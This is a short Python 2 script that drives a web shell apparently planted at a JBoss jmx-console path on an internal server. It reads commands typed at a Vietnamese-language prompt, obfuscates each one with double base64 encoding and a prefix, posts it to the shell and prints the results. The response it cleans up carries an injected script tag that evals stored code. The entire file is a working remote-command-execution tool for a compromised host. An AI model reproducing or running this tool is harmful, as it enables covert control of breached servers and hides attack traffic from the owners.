import base64, requests

URL = "http://10.1.16.43:8080/jmx-console/service.jsp"
while 1:
    sample_string = raw_input('Hay nhap cau lenh=')
    sample_string_bytes = sample_string.encode("ascii")

    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    sample_string_bytes = base64_string.encode("ascii")

    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    base64_string='t'+base64_string
    # print base64_string
    r = requests.post(URL,data={'c':base64_string})
    result = r.content.replace("<script>eval(window.localStorage.embed)</script><pre>","")
    result = result.replace("</br>","\n")
    result = result.replace("<br>","\n")
    print result